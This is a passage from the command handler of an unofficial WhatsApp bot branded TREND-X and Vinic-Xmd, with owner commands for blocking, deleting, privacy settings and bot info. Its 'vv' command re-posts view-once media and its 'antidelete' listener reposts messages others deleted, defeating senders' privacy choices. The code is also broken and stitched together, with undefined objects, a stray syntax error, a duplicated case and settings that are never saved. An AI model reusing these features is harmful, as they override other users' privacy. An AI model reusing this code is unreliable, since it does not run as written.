                        return obj[key];
                    }
                    if (typeof obj[key] === 'object') {
                        const nestedId = findId(obj[key]);
                        if (nestedId) return nestedId;
                    }
                }
                return null;
            };      
            channelId = findId(metadata);
        }
        if (!channelId) {
            console.warn('Warning: ChannelId tidak ditemukan di response, menggunakan fallback...');
            channelId = "unknown-channel-id";
        }
        let successDetails = [];
        successDetails.push(`✅ Channel "${channelName}" `);
        if (channelDesc) {
            successDetails.push(`✅ Description Added`);
        }
        successDetails.push(`\nID Channel: ${channelId}`);
        await conn.sendMessage(m.chat, {
            text: successDetails.join('\n')
        });
    } catch (error) {
        console.error('Error creating channel:', error);
        m.reply(`${error.message}`);
    }
}
break 
case "del": {
if (!Access) return reply(mess.owner);
    if (!m.quoted) return reply(`*Please reply to a message*`);

    try {
     
      await conn.sendMessage(m.chat, {
        delete: {
          remoteJid: m.quoted.fakeObj.key.remoteJid,
          fromMe: m.quoted.fakeObj.key.fromMe,
          id: m.quoted.fakeObj.key.id,
          participant: m.quoted.fakeObj.participant,
        }
      });

      
      await conn.sendMessage(m.chat, {
        delete: {
          remoteJid: m.key.remoteJid,
          fromMe: m.key.fromMe,
          id: m.key.id,
          participant: m.key.participant,
        }
      });

    } catch (err) {
      console.error(err);
      reply("⚠️ Failed to delete message.");
   }

}
break
case "block": {
if (!Access) return reply(mess.owner);
    if (!m.quoted && !m.mentionedJid[0] && !text) return reply("Reply to a message or mention/user ID to block");

    const userId = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    await conn.updateBlockStatus(userId, "block");
    reply(mess.done);
}
break
case "public": {
if (!Access) return reply(mess.owner) 
conn.public = true
reply(`*Vinic-Xmd successfully changed to public mode* ${command}.`)
}
break
case 'readviewonce': case 'vv': {
    try {
        if (!m.quoted) return reply('❌ Reply to a ViewOnce Video, Image, or Audio.');

        const quotedMessage = m.msg.contextInfo.quotedMessage;
        if (!quotedMessage) return replyphistar('❌ No media found in the quoted message.');

        if (quotedMessage.imageMessage) {
            let imageCaption = quotedMessage.imageMessage.caption || '';
            let imageUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
            await conn.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        }

        if (quotedMessage.videoMessage) {
            let videoCaption = quotedMessage.videoMessage.caption || '';
            let videoUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
            await JinwooBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        }

        if (quotedMessage.audioMessage) {
            let audioUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
            await conn.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' });
        }

    } catch (error) {
        console.error('Error processing vv command:', error);
        replyphistar('❌ An error occurred while processing your request.');
    }
    
}
break
case "owner": {
  try {
    const ownerList = [];
    // Ensure global.ownernumber is defined and is a string
    const ownerNumber = global.ownernumber && typeof global.ownernumber === 'string' 
      ? global.ownernumber 
      : ''; // Fallback to empty string if undefined
    const ownerNumbers = [
      ownerNumber.includes('@') 
        ? ownerNumber 
        : `${ownerNumber}@s.whatsapp.net`
    ];

    for (const number of ownerNumbers) {
      const displayName = await conn.getName(number);
      ownerList.push({
        displayName: displayName || global.ownername || 'Owner', // Fallback if displayName or global.ownername is undefined
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${global.ownername || 'Owner'}\nFN:${global.ownername || 'Owner'}\nitem1.TEL;waid=${number.split('@')[0]}:${number.split('@')[0]}\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
      });
    }

    await conn.sendMessage(
      m.chat,
      { contacts: { displayName: `${ownerList.length} Contact`, contacts: ownerList }, mentions: [sender] },
      { quoted: m }
    );
  } catch (error) {
    console.error('Error sending owner contact:', error.message);
    await conn.sendMessage(
      m.chat,
      { text: `*Error:* ${error.message}` },
      { quoted: m }
    );
  }
  break; // Ensure the case block is properly terminated.
}
case "antidelete": {
    // Initialize database object
    const db = {
        settings: {
            antidelete: false // Default value
        }
    };

    // Define saveDatabase function
    const saveDatabase = async () => {
        try {
            // In a real implementation, you would save to a file or database here
            // For this example, we'll just simulate saving
            console.log('Settings saved:', db.settings);
            return true;
        } catch (error) {
            console.error('Error saving settings:', error);
            return false;
        }
    };

    if (!Access) return reply(mess.owner);
    if (args.length < 1) return reply(`Example: ${prefix + command} private/chat/off\n\nprivate - sends deleted messages to yourself\nchat - sends to current chat\noff - disables antidelete`);

    const validOptions = ["private", "chat", "off"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) return reply("Invalid option. Use: private, chat, or off");

    db.settings.antidelete = option;
    
    // Save the setting
    await saveDatabase();

    // Add event listener for deleted messages
    if (option !== "off") {
        conn.ev.on('messages.delete', async (item) => {
            const deletedMsg = item.messages[0];
            if (!deletedMsg) return;

            const sender = deletedMsg.key.participant || deletedMsg.key.remoteJid;
            const deletedBy = item.keys[0].participant || item.keys[0].remoteJid;
            const chatName = isGroup ? groupName : "Private Chat";
            
            const xtipes = moment(deletedMsg.messageTimestamp * 1000).tz(global.timezones).locale('en').format('HH:mm z');
            const xdptes = moment(deletedMsg.messageTimestamp * 1000).tz(global.timezones).format("DD/MM/YYYY");

            let mediaInfo = `🚨 *DELETED MESSAGE!* 🚨
${readmore}
CHAT: ${chatName}
SENT BY: @${sender.split('@')[0]} 
TIME: ${xtipes}
DATE: ${xdptes}
DELETED BY: @${deletedBy.split('@')[0]}`;

            try {
                // Handle different message types
                const messageContent = deletedMsg.message || deletedMsg.msg || {};
                if (messageContent.imageMessage || messageContent.videoMessage) {
                    const media = await conn.downloadMediaMessage(deletedMsg);
                    const caption = (messageContent.imageMessage?.caption || messageContent.videoMessage?.caption || '').trim();
                    
                    if (option === "private") {
                        await conn.sendMessage(
                            conn.user.id, 
                            { 
                                [messageContent.imageMessage ? 'image' : 'video']: media,
                                caption: `${mediaInfo}\n\n${caption}`,
                                mentions: [sender, deletedBy]
                            }
                        );
                    } else {
                        await conn.sendMessage(
                            m.chat, 
                            { 
                                [messageContent.imageMessage ? 'image' : 'video']: media,
                                caption: `${mediaInfo}\n\n${caption}`,
                                mentions: [sender, deletedBy]
                            }
                        );
                    }
                } else if (messageContent.conversation || messageContent.extendedTextMessage?.text) {
                    const text = messageContent.conversation || messageContent.extendedTextMessage.text;
                    
                    if (option === "private") {
                        await conn.sendMessage(
                            conn.user.id, 
                            { 
                                text: `${mediaInfo}\n\nMESSAGE: ${text}`,
                                mentions: [sender, deletedBy]
                            }
                        );
                    } else {
                        await conn.sendMessage(
                            m.chat, 
                            { 
                                text: `${mediaInfo}\n\nMESSAGE: ${text}`,
                                mentions: [sender, deletedBy]
                            }
                        );
                    }
                }
            } catch (error) {
                console.error('Error handling deleted message:', error);
            }
        });
    } else {
        // Remove the event listener if antidelete is off
        conn.ev.off('messages.delete');
    }

    reply(`Anti-delete mode set to: *${option}*`);
}
break 
case "antibug": {
  const db = {
    settings: {
      antibug: false // Default value
    }
  };

  // Add saveDatabase function definition
  const saveDatabase = async () => {
     // Implementation to save the database
    return true; // Assume success for the existing code to work
  };
  
if (!Access) return reply(mess.owner);
    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`);

    const validOptions = ["on", "off"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) return reply("Invalid option");

    db.settings.antibug = option === "on";

    await saveDatabase();

    reply(`Anti-bug (Experimental) ${option === "on" ? "enabled" : "disabled"} successfully`);
}
break
case "listblocked": {
if (!Access) return reply(mess.owner);

    try {
      const blockedList = await conn.fetchBlocklist();

      if (!blockedList.length) {
        return reply('✅ No contacts are currently blocked.');
      }

      let blockedUsers = blockedList.map((user, index) => `🔹 *${index + 1}.* @${user.split('@')[0]}`).join('\n');

      await conn.sendMessage(m.chat, {
        text: `🚫 *Blocked Contacts:*\n\n${blockedUsers}`,
        mentions: blockedList
      }, { quoted: m });

    } catch (error) {
      reply('⚠️ Unable to fetch blocked contacts.');
  }
}
break
case "unblock": {
if (!Access) return reply(mess.owner);
    if (!m.quoted && !m.mentionedJid[0] && !text) return reply("Reply to a message or mention/user ID to unblock");

    const userId = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    await conn.updateBlockStatus(userId, "unblock");
    reply(mess.done);
}
break
case "anticall": {
    // Initialize database object
    const db = {
        settings: {
            anticall: "off" // Default value
        }
    };

    // Define saveDatabase function
    const saveDatabase = async () => {
        try {
            // In a real implementation, you would save to a file or database here
            // For this example, we'll just simulate saving
            console.log('Anticall settings saved:', db.settings);
            return true;
        } catch (error) {
            console.error('Error saving anticall settings:', error);
            return false;
        }
    };

    if (!Access) return reply(mess.owner);
    if (args.length < 1) return reply(`Example: ${prefix + command} block/decline/off\n\nblock - Declines and blocks callers\ndecline - Declines incoming calls\noff - disables anticall`);

    const validOptions = ["block", "decline", "off"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) return reply(`Invalid option; type *${prefix}anticall* to see available options!`);

    db.settings.anticall = option;
    await saveDatabase();

    // Add event listener for calls if not off
    if (option !== "off") {
        conn.ev.on('call', async (call) => {
            try {
                const caller = call.from;
                const callType = call.isVideo ? "Video Call" : "Voice Call";
                const timestamp = moment().tz(global.timezones).format("HH:mm:ss");

                console.log(`Incoming ${callType} from ${caller} at ${timestamp}`);

                // Decline the call first
                await conn.sendMessage(caller, {
                    text: `📵 ${global.botname} has call protection enabled!`,
                });
                await conn.rejectCall(call.id);

                // Additional actions based on mode
                if (option === "block") {
                    // Block the caller
                    await conn.updateBlockStatus(caller, "block");
                    console.log(`Blocked ${caller} for attempting a call`);
                    
                    // Notify admin
                    if (global.owner) {
                        await conn.sendMessage(global.owner, {
                            text: `🚫 Blocked ${caller} for attempting a ${callType}\nTime: ${timestamp}`,
                            mentions: [caller]
                        });
                    }
                }

                // Log the call attempt
                await conn.sendMessage(m.chat, {
                    text: `⚠️ *Call Blocked*\n\n• Type: ${callType}\n• Caller: @${caller.split('@')[0]}\n• Time: ${timestamp}\n• Action: ${option === "block" ? "Blocked" : "Declined"}`,
                    mentions: [caller]
                }, { quoted: m });

            } catch (error) {
                console.error('Error handling call:', error);
                reply('⚠️ Failed to handle incoming call');
            }
        });
    } else {
        // Remove the event listener if anticall is off
        conn.ev.off('call');
        console.log('Call protection disabled');
    }

    reply(`Anti-call set to *${option}* successfully.`);
} antidelete 
break 
case "leave": {
if (!Access) return reply(mess.owner);
    if (!m.isGroup) return reply(mess.group);

    reply("*Goodbye, it was nice being here!*");
    await sleep(3000);
    await conn.groupLeave(m.chat);
}
break
case "getpp": {
if (!Access) return reply(mess.owner);
    if (!m.quoted) {
      return reply('Reply to a user to get their profile picture.');
    }

    const userId = m.quoted.sender;

    try {
      const ppUrl = await conn.profilePictureUrl(userId, 'image');

   await conn.sendMessage(m.chat, 
            { 
                image: { url: ppUrl }, 
                caption: `⌘ *Profile Picture of:* @${userId.split('@')[0]}`,
                mentions: [ userId ]
            }, { quoted: m }); 
    } catch {
      await conn.sendMessage(m.chat, { image: { url: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' }, caption: '⚠️ No profile picture found.' }, { quoted: m });
    }
}
break
case "setpp": {
    if (!Access) return reply(mess.owner);
    if (!quoted) return reply(`*Send or reply to an image With captions ${prefix + command}*`);
    if (!/image/.test(mime)) return reply(`*Send or reply to an image With captions ${prefix + command}*`);
    if (/webp/.test(mime)) return reply(`*Send or reply to an image With captions ${prefix + command}*`);

    const medis = await conn.downloadAndSaveMediaMessage(quoted, "ppbot.jpeg");

    if (args[0] === "full") {
      const { img } = await generateFullProfilePic(medis);
      await conn.query({
        tag: "iq",
        attrs: {
          to: botNumber,
          type: "set",
          xmlns: "w:profile:picture",
        },
        content: [
          {
            tag: "picture",
            attrs: {
              type: "image",
            },
            content: img,
          },
        ],
      });
      fs.unlinkSync(medis);
      reply(mess.done);
    } else {
      await conn.updateProfilePicture(botNumber, {
        url: medis,
      });
      fs.unlinkSync(medis);
      reply(mess.done);
    }
}
break
case "toviewonce": {
if (!Access) return reply(mess.owner);
    if (!quoted) return reply(`*Reply to an Image or Video*`);

    if (/image/.test(mime)) {
      const anuan = await conn.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(
        m.chat,
        {
          image: { url: anuan },
          caption: mess.done,
          fileLength: "999",
          viewOnce: true
        },
        { quoted: m }
      );
    } else if (/video/.test(mime)) {
      const anuanuan = await conn.downloadAndSaveMediaMessage(quoted);
      Cypher.sendMessage(
        m.chat,
        {
          video: { url: anuanuan },
          caption: mess.done,
          fileLength: "99999999",
          viewOnce: true
        },
        { quoted: m }
      );
    } else if (/audio/.test(mime)) {
      const bebasap = await conn.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(m.chat, {
        audio: { url: bebasap },
        mimetype: "audio/mpeg",
        ptt: true,
        viewOnce: true
      });
   }
}
break
case "private": {
if (!Access) return reply(mess.owner) 
conn.public = false
reply(`*trend-X successfully changed to private mode*  ${command}.`)
}
break
case "autotyping": {
const db = {
    settings: {
      autorecording: false // Default value
    }
  };

  // Add saveDatabase function definition
  const saveDatabase = async () => {
    // Implementation to save the database
    return true; // Assume success for the existing code to work
  };
  
  if (!Access) return reply(mess.owner);
    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`);

    const validOptions = ["on", "off"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) return reply("Invalid option");
    
    db.data.settings.autotype = option === true;
    reply(`Auto-typing ${option === "on" ? "enabled" : "disabled"} successfully`);
}
break
case " join": {
if (!Access) return reply(mess.owner);
    if (!text) return reply("Enter group link");
    if (!isUrl(args[0]) && !args[0].includes("whatsapp.com")) return reply("Invalid link");

    try {
      const link = args[0].split("https://chat.whatsapp.com/")[1];
      await Cypher.groupAcceptInvite(link);
      reply("Joined successfully");
    } catch {
      reply("Failed to join group");
    }
}
break
case "request": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Example: ${prefix + command} I would like a new feature (specify) to be added.`);

    const requestMsg = `
*REQUEST*

*User*: @${m.sender.split("@")[0]}
*Request*: ${text}

    `;

    const confirmationMsg = `
Hi ${m.pushName},

Your request has been forwarded to my developer.
Please wait for a reply.

*Details:*
${requestMsg}
    `;

    conn.sendMessage("254734939236@s.whatsapp.net", { text: requestMsg, mentions: [m.sender] }, { quoted: m });
    conn.sendMessage(m.chat, { text: confirmationMsg, mentions: [m.sender] }, { quoted: m });
}
break
case "reportbug": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Example: ${prefix + command} Hey, play command isn't working`);

    const bugReportMsg = `
*BUG REPORT*

*User*: @${m.sender.split("@")[0]}
*Issue*: ${text}

    `;

    const confirmationMsg = `
Hi ${m.pushName},

Your bug report has been forwarded to my developer.
Please wait for a reply.

*Details:*
${bugReportMsg}
    `;

    conn.sendMessage("254734939236@s.whatsapp.net", { text: bugReportMsg, mentions: [m.sender] }, { quoted: m });
    conn.sendMessage(m.chat, { text: confirmationMsg, mentions: [m.sender] }, { quoted: m });
}
break
case "groupid": {
    if (!Access) return reply(mess.owner);
    const groupLink = args[0]; // Get the group link from arguments
    if (!groupLink) return reply('Please provide a group link!');
    
    let coded = groupLink.split("https://chat.whatsapp.com/")[1];
    if (!coded) return reply("Link Invalid");

    conn.query({
      tag: "iq",
      attrs: {
        type: "get",
        xmlns: "w:g2",
        to: "@g.us"
      },
      content: [{ tag: "invite", attrs: { code: coded } }]
    }).then(async (res) => {
      const tee = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`;
      reply(tee + '@g.us');
    }).catch(err => {
      reply("Error processing group link: " + err.message);
    });
}
break
case "autotyping": {
                if (!Access) return reply(mess.owner)

                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)

                if (q === 'on') {

                    autoTyping = true

                    reply(`Successfully 💠changed auto-typing to ${q}`)

                } else if (q === 'off') {

                    autoTyping = false

                    reply(`Successfully 💠changed auto-typing to ${q}`)
        }
}
break
case "autorecording": {

                if (!Access) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true

                    reply(`Successfully 💠changed auto-recording to ${q}`)

                } else if (q === 'off') {

                    autoRecording = false

                    reply(`Successfully changed auto-recording to ${q} `)

           }
}
break
case "lastseen": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Options: all/contacts/contact_blacklist/none\nExample: ${prefix + command} all`);

    const validOptions = ["all", "contacts", "contact_blacklist", "none"];
    if (!validOptions.includes(args[0])) return reply("Invalid option");

    await conn.updateLastSeenPrivacy(text);
    await reply(mess.done);
}
break 
case "unblockall": {
    if (!Access) return reply(mess.owner);

    try {
      const blockedList = await conn.fetchBlocklist();
      if (!blockedList.length) return reply("✅ No blocked contacts to unblock.");

      for (const user of blockedList) {
        await conn.updateBlockStatus(user, "unblock");
      }

      reply(`✅ Successfully unblocked *${blockedList.length}* contacts.`);
    } catch (error) {
      reply("⚠️ Failed to unblock all contacts.");
    }
}
break
case "online": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Options: all/match_last_seen\nExample: ${prefix + command} all`);

    const validOptions = ["all", "match_last_seen"];
    if (!validOptions.includes(args[0])) return reply("Invalid option");

    await conn.updateOnlinePrivacy(text);
    await reply(mess.done);
}
break
case "setbio": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Text needed*\nExample: ${prefix + command} ${global.botname}`);

    await conn.updateProfileStatus(text);
    reply(`*Successfully updated bio to "${text}"*`);
}
break
//====Cmd menu commands====
case "ping": {
const startTime = performance.now();

    try {
      const sentMessage = await conn.sendMessage(m.chat, {
        text: "🔸Pong!",
        contextInfo: { quotedMessage: m.message }
      });
      
      const endTime = performance.now();
      const latency = `${(endTime - startTime).toFixed(2)} ms`;
      
      await conn.sendMessage(m.chat, {
        text: `*💯 ${botname} Speed:* ${latency}`,
        edit: sentMessage.key, 
        contextInfo: { quotedMessage: m.message }
      });

    } catch (error) {
      console.error('Error sending ping message:', error);
      await conn.sendMessage(m.chat, {
        text: 'An error occurred while trying to ping.',
        contextInfo: { quotedMessage: m.message }
      });
   }
}
break
case "repo": {
  try {
    const { data } = await axios.get('https://api.github.com/repos/Kevintech-hub/Vinic-Xmd-');
    const repoInfo = `
    *🔹 BOT REPOSITORY 🔹*
    
🔸 *Name:* ${data.name}
🔸 *Stars:* ${data.stargazers_count}
🔸 *Forks:* ${data.forks_count}
🔸 *GitHub Link:* 
https://github.com/trendex2030/TREND-X

@${m.sender.split("@")[0]}👋, Don't forget to star and fork my repository!`;

    conn.sendMessage(m.chat, {
      text: repoInfo.trim(),
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          title: "Vinic-Xmd Repository",
          thumbnail: botImage,
          mediaType: 1
        }
      }
    }, { quoted: m });
  } catch (error) {
    reply('❌ *Error fetching repository details.*');
  }
 
}
break 
case "sc": {
const githubRepoURL = 'https://github.com/trendex2030/TREND-XV2';

    try {
        // Extract username and repo name from the URL
        const [, username, repoName] = githubRepoURL.match(/github\.com\/([^/]+)\/([^/]+)/);

        // Fetch repository details using GitHub API
        const response = await fetch(`https://api.github.com/repos/${username}/${repoName}`);
        
        if (!response.ok) {
            throw new Error(`GitHub API request failed with status ${response.status}`);
        }

        const repoData = await response.json();

        // Format the repository information
        const formattedInfo = `*𝐇𝐄𝐋𝐋𝐎 𝐓𝐇𝐄𝐑𝐄 TREND-X 𝐖.𝐀 𝐁𝐎𝐓 𝐔𝐒𝐄𝐑!😇👑* 

> *sɪᴍᴘʟᴇ, ɪᴄʏ, ᴄᴏʟᴅ  & ʀɪᴄʜ ʟᴏᴀᴅᴇᴅ ʙᴏᴛ ᴡɪᴛʜ ᴀᴍᴀᴢɪɴɢ ғᴇᴀᴛᴜʀᴇs, TREND-X ᴡʜᴀᴛsᴀᴘᴘ ʙᴏᴛ.*❄️

*𝐓𝐇𝐀𝐍𝐊𝐒 𝐅𝐎𝐑 𝐔𝐒𝐄𝐈𝐍𝐆 TREND-X🫶* 

> *ᴅᴏɴ'ᴛ ғᴏʀɢᴇᴛ ᴛᴏ sᴛᴀʀ & ғᴏʀᴋ ᴛʜᴇ ʀᴇᴘᴏ🌟🍴*

https://github.com/trendex2030/TREND-XV2
──────────────────
${readMore}
\`BOT NAME:\`❄️
> ${repoData.name}

\`OWNER NAME:\`👨‍💻
> ${repoData.owner.login}

\`STARS:\`🌟
> ${repoData.stargazers_count}

\`FORKS:\`🍴
> ${repoData.forks_count}

\`DESCRIPTION:\`📃
> ${repoData.description || 'No description'}\n
──────────────────
\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ TREND-X TECH* 🎐`;

        // Send an image with the formatted info as a caption and context info
        await conn.sendMessage(from, {
            image: { url: `https://files.catbox.moe/adymbp.jpg` },
            caption: formattedInfo,
            contextInfo: { 
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363401765045963@newsletter',
                    newsletterName: '☇ TREND-X  suppσrt  ⃪🤖͎᪳᪳𝆺𝅥',
                    serverMessageId: 143
                }
            }
        }, { quoted: mek });

        // Send the audio file with context info
        await conn.sendMessage(from, {
            audio: { url: 'https://files.catbox.moe/gttyv1.mp3' },
            mimetype: 'audio/mp4',
            ptt: true,
            contextInfo: { 
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363401548261516@newsletter',
                    newsletterName: '☇ Vinic-Xmd  suppσrt⃪🤖͎᪳᪳𝆺𝅥',
                    serverMessageId: 143
                }
            }
        }, { quoted: mek });

    } catch (error) {
        console.error("Error in repo command:", error);
        reply("Sorry, something went wrong while fetching the repository information. Please try again later.");
    }
}
break
//======other menu=====
case "alive": {
    const botUptime = runtime(process.uptime());
    const imageUrl = "https://files.catbox.moe/adymbp.jpg";
    const audioUrl = "https://files.catbox.moe/ckie6b.m4a";
    
    // Send the image with caption
    await conn.sendMessage(
        m.chat, 
        { 
            image: { url: imageUrl },
            caption: `*🌹Hi. I am 👑TREND-X, a friendly WhatsApp bot from KENYA 🇰🇪, created by trendex tech. Don't worry, I'm still Alive☺🚀*\n\n*⏰ Uptime:${botUptime}*`
        },
        { quoted: m }
    );
    
    // Send the audio as PTT
    await conn.sendMessage(
        m.chat,
        {
            audio: { url: audioUrl },
            ptt: true,
            mimetype: 'audio/mp4'
        },
        { quoted: m }
    );
}
break
case 'botinfo': {
  const botInfo = `
╭─ ⌬ Bot Info
│ • Name     : ${botname}
│ • Owner    : ${ownername}
│ • Version  : ${global.versions}
│ • ᴄᴍᴅs    : 100+
│ • Developer: trendex king
│ • Runtime  : ${runtime(process.uptime())}
╰─────────────`

  const imageUrl = "https://files.catbox.moe/adymbp.jpg";
    const audioUrl = "https://files.catbox.moe/bguhrq.mp3";
    
    // Send the image with caption
    await conn.sendMessage(
        m.chat, 
        { 
            image: { url: imageUrl },
            caption: `*🌹Hi. I am 👑TREND-X, a friendly WhatsApp bot.*╭─ ⌬ Bot Info
│ • Name     : ${botname}
│ • Owner    : ${ownername}
│ • Version  : ${global.versions}
│ • ᴄᴍᴅs    : 100+
│ • Developer: trendex king
│ • Runtime  : ${runtime(process.uptime())}
╰─────────────`
        },
        { quoted: m }
    );
    
    // Send the audio as PTT
    await conn.sendMessage(
        m.chat,
        {
            audio: { url: audioUrl },
            ptt: true,
            mimetype: 'audio/mp4'
        },
        { quoted: m }
    );
}
break
case "dev":
case "developer": {
  try {
    // Developer information (replace with your actual details)
    const devInfo = {
      name: "TRENDEX",      // Developer name
      number: "254734939236",  // Developer WhatsApp number (without + or @)
      organization: "TREND-X Development Team",
      note: "Bot Developer"
    };

    // Create vCard
    const vcard = `BEGIN:VCARD
VERSION:3.0
FN:${devInfo.name}
ORG:${devInfo.organization};
TEL;type=CELL;type=VOICE;waid=${devInfo.number}:${devInfo.number}
NOTE:${devInfo.note}
END:VCARD`;

    // Send as contact card
    await conn.sendMessage(
      m.chat, 
      {
        contacts: {
          displayName: devInfo.name,
          contacts: [{
            displayName: devInfo.name,
            vcard: vcard
          }]
        },
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
            title: `Developer Contact`,
            body: `Contact ${devInfo.name} for support`,
            thumbnail: fs.readFileSync('./start/lib/catbox.js'), // Your dev photo
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      },
      { quoted: m }
    );

    // Also send text info as fallback
    await conn.sendMessage(
      m.chat,
      { 
        text: `👨‍💻 *Developer Information*\n\n` +
              `• *Name:* ${devInfo.name}\n` +
              `• *Contact:* wa.me/${devInfo.number}\n` +
              `• *Role:* ${devInfo.note}\n` +
              `• *Team:* ${devInfo.organization}`,
              
        mentions: [m.sender]
      },
      { quoted: m }
    );

  } catch (error) {
    console.error('Error in dev command:', error);
    reply("❌ Failed to display developer information. Please try again later.");
  }
}
break
case "serverinfo": { 
const start = performance.now();
const cpus = os.cpus();
const uptimeSeconds = os.uptime();
const muptime = runtime(process.uptime()).trim()
const uptimeDays = Math.floor(uptimeSeconds / 86400);
const uptimeHours = Math.floor((uptimeSeconds % 86400) / 3600);
const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
const uptimeSecs = Math.floor(uptimeSeconds % 60);
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const formattedTotalMem = formatSize(totalMem);
const loadAverage = os.loadavg().map(avg => avg.toFixed(2)).join(", ");
const speed = (performance.now() - start).toFixed(3);

const serverInfo = `Server Information:\n
- CPU Cores: ${cpus.length}
- CPU Model: ${cpus[0].model}
- Platform: ${os.platform()}
- Architecture: ${os.arch()}
- Uptime: ${uptimeDays}d ${uptimeHours}h ${uptimeMinutes}m ${uptimeSecs}s
- RAM: ${formattedUsedMem} / ${formattedTotalMem}
- Load Average (1, 5, 15 min): ${loadAverage}
- Response Time: ${speed} seconds
- Runtime: ${muptime}
- Type: case 
`.trim();

await reply(serverInfo)
}
break
case "botstatus": {
  const used = process.memoryUsage();
  const ramUsage = `${formatSize(used.heapUsed)} / ${formatSize(os.totalmem())}`;
  const freeRam = formatSize(os.freemem());
  
  // Properly await checkDiskSpace
  const disk = await checkDiskSpace(process.cwd()); 
  
  const latencyStart = performance.now();
  await reply("⏳ *Calculating ping...*");
  const latencyEnd = performance.now();
  const ping = `${(latencyEnd - latencyStart).toFixed(2)} ms`;

  const { download, upload } = await checkBandwidth();
  const uptime = runtime(process.uptime());

  const response = `
  *🔹 BOT STATUS 🔹*

  🔸 *Ping:* ${ping}
  🔸 *Uptime:* ${uptime}
  🔸 *RAM Usage:* ${ramUsage}
  🔸 *Free RAM:* ${freeRam}
  🔸 *Disk Usage:* ${formatSize(disk.size - disk.free)} / ${formatSize(disk.size)}
  🔸 *Free Disk:* ${formatSize(disk.free)}
  🔸 *Platform:* ${os.platform()}
  🔸 *NodeJS Version:* ${process.version}
  🔸 *CPU Model:* ${os.cpus()[0].model}
  🔸 *Downloaded:* ${download}
  🔸 *Uploaded:* ${upload}
  `;

  await conn.sendMessage(m.chat, { text: response.trim() }, { quoted: m });
}
break
case "getabout": {
if (!Access) return reply(mess.owner);
    if (!m.quoted) {
      return reply('Reply to a user to get their about/bio.');
    }

    const userId = m.quoted.sender;

    try {
      const { status, setAt } = await conn.fetchStatus(userId);
      const formattedDate = moment(setAt).format("MMMM Do YYYY, h:mm:ss A");

      await conn.sendMessage(m.chat, { 
        text: `🔹 *About of:* @${userId.split('@')[0]}\n\n"${status}"\n\n🕒 *Set at:* ${formattedDate}`,
        mentions: [userId] 
      }, { quoted: m });

    } catch {
      reply('⚠️ Unable to fetch the user’s about info. This may be due to their privacy settings.');
    }
}
break
case "time": {
    try {
        // Get current time with timezone support
        const now = moment().tz(global.timezones || "Africa/Kampala"); // Default to Kampala if not set
        const timeInfo = `
⏰ *Current Time Information* ⏰

🌍 *Timezone:* ${now.format('z (Z)')}
📅 *Date:* ${now.format('dddd, MMMM Do YYYY')}
🕒 *Time:* ${now.format('h:mm:ss A')}
📆 *Week Number:* ${now.format('WW')}
⏳ *Day of Year:* ${now.format('DDD')}
🌞 *Sunrise/Sunset:* ${getSunriseSunset(now)}`;

        // Send formatted time information
        await conn.sendMessage(
            m.chat,
            { 
                text: timeInfo.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: `${global.botname} Time Service`,
                        body: `Powered by Moment.js`,
                        thumbnail: await getBuffer('https://i.imgur.com/JiW7R2Y.png'),
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            },
            { quoted: m }
        );

    } catch (error) {
        console.error('Error in time command:', error);
        reply('⚠️ An error occurred while fetching time information. Please try again later.');
    }
    break;

    // Helper function for sunrise/sunset (example implementation)
    function getSunriseSunset(date) {
        // This is a simplified example - you might want to use a proper API for accurate data
        const lat = 0.3136;  // Example: Kampala coordinates
        const lng = 32.5811;
        const sunrise = date.clone().hour(6).minute(45).format('h:mm A');
        const sunset = date.clone().hour(18).minute(45).format('h:mm A');
        return `☀️ ${sunrise} - 🌙 ${sunset}`;
    }
}
break
case "blackpinklogo": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}blackpinklogo Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-blackpink-logo-online-free-607.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.success}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in blackpinklogo command:", error);
      reply("*An error occurred while generating the effect.*");
  }
}
break
case "dragonball": {
